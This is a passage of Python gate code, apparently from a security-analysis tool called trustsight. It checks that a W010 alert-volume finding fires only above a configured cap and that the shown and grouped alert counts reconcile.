    return Gate("alert grouping is reported", not problems,
                problems or ["W010 + SATURATED boundary"])


def gate_alert_counts_reconcile() -> Gate:
    """§1: grouping is bounded and reconciles; below the cap nothing fires."""
    from trustsight.analysis.meta import alert_volume_finding

    problems: list[str] = []
    for cap in (1, 5, 50):
        config = {"alerts": {"max_rendered_findings": cap},
                  "severity_weights": {"HIGH": 25, "INFO": 0}}
        for n in (0, cap, cap + 1, cap + 7):
            rules = [{"rule_id": f"C{i:03d}", "severity": "HIGH"}
                     for i in range(n)]
            finding = alert_volume_finding(rules, config)
            if n <= cap:
                if finding is not None:
                    problems.append(f"W010 fired at {n} <= cap {cap}")
            else:
                if finding is None:
                    problems.append(f"no W010 at {n} > cap {cap}")
                    continue
                p = finding["params"]
                if p["shown"] + p["grouped"] != p["rendered"]:
                    problems.append(f"counts do not reconcile at {n}/{cap}")
    return Gate("alert counts reconcile", not problems,
                problems or "shown + grouped == rendered")
